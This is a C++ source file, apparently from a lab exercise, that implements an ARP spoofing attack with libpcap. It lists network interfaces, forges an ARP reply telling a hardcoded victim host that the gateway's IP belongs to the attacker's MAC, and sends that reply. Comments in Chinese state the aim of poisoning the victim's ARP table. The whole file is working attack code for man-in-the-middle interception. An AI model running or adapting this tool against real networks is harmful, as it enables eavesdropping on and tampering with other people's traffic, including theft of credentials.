#include "ArpSpoof.h"

using std::cout;
using std::cin;
using std::endl;

ArpSpoof::ArpSpoof(/* args */)
{
}
ArpSpoof::~ArpSpoof()
{
}


void ArpSpoof::initDevice()
{
    int ret = pcap_findalldevs(&m_alldevices,errbuf);
    if (ret == -1)
    {
        cout<<errbuf<<endl;
    }
    else
    {
        int i = 0;
        for (pcap_if_t *d = m_alldevices ; d; d = d->next)
        {
            // cout<<d->name;
            if (d->description)
            {
                cout<<i++<<":"<<d->description<<endl;
            }
            else
            {
                cout<<i<<":"<<"no description"<<endl;
                pcap_freealldevs(m_alldevices);
            }
            
        }
    }
    m_device = m_alldevices;
    int count;
    cout<<endl<<"--------choise device-------"<<endl;
    cin>>count;
    for (size_t i = 0; i < count; i++)
    {
        m_device = m_device->next;
    }
    cout<<m_device->description<<endl;

}


void ArpSpoof::SetArpPacker()
{
    StrToHex strtohex;

    //被攻击者mac
    //00:0c:29:c0:41:8a
    u_char dhost[6];
    char dmac[] = { "00:0c:29:c0:41:8a" };
    strtohex.Mac(dmac,dhost);
    // kali
    // dhost[0] = 0x00;
	// dhost[1] = 0x0c;
	// dhost[2] = 0x29;
	// dhost[3] = 0xc0;
	// dhost[4] = 0x41;
	// dhost[5] = 0x8a;

    //发送方mac
    //00-0C-29-4B-78-AB
    u_char shost[6];
    char smac[] = { "00:0c:29:4b:78:ab" };
    strtohex.Mac(smac,shost);
    // shost[0] = 0x00;
	// shost[1] = 0x0C;
	// shost[2] = 0x29;
	// shost[3] = 0x4B;
	// shost[4] = 0x78;
	// shost[5] = 0xAB;

    memcpy(m_arppacket.EtherHead.ether_dhost,dhost,6);
    memcpy(m_arppacket.EtherHead.ether_shost,shost,6);

    m_arppacket.EtherHead.ether_type =htons(0x0806);
    m_arppacket.ArpHead.hardware_type = htons(0x1);
    m_arppacket.ArpHead.protocol_type = htons(0x0800);
    m_arppacket.ArpHead.hardware_length = 6;
    m_arppacket.ArpHead.protocol_length = 4;
    // m_arppacket.ArpHead.operation_code = htons(0x1); //request
    m_arppacket.ArpHead.operation_code = htons(0x2); //reply

    //达到毒化目的的ip 毒化目标主机arp表中网关ip对应的mac为自身的mac
    char sipadd[] = { "192.168.204.2" };
    u_char sip[4] = {0};
    strtohex.IP(sipadd,sip);

    //被攻击者ip
    char dipadd[] = { "192.168.204.130" };
    u_char dip[4] = {0};
    strtohex.IP(dipadd,dip);

    memcpy(m_arppacket.ArpHead.destination_ethernet_address,dhost,6);
    memcpy(m_arppacket.ArpHead.source_ip_address,sip,4);
    
    memcpy(m_arppacket.ArpHead.source_ethernet_address,shost,6);
    memcpy(m_arppacket.ArpHead.destination_ip_address,dip,4);


}

void ArpSpoof::SendPacket()
{
    m_fp = pcap_open_live(m_device->name,BUFSIZ,PCAP_OPENFLAG_PROMISCUOUS,1000,errbuf);
    u_char *packet;
    int ret = pcap_sendpacket(m_fp,(const u_char *)&m_arppacket,sizeof(m_arppacket));
    if (ret == 0)
    {
        cout<<endl<<"PacketSend succeed"<<endl;
    }
    else {
		cout<<"PacketSendPacket in getmine Error: "<<GetLastError();
	}
    
}

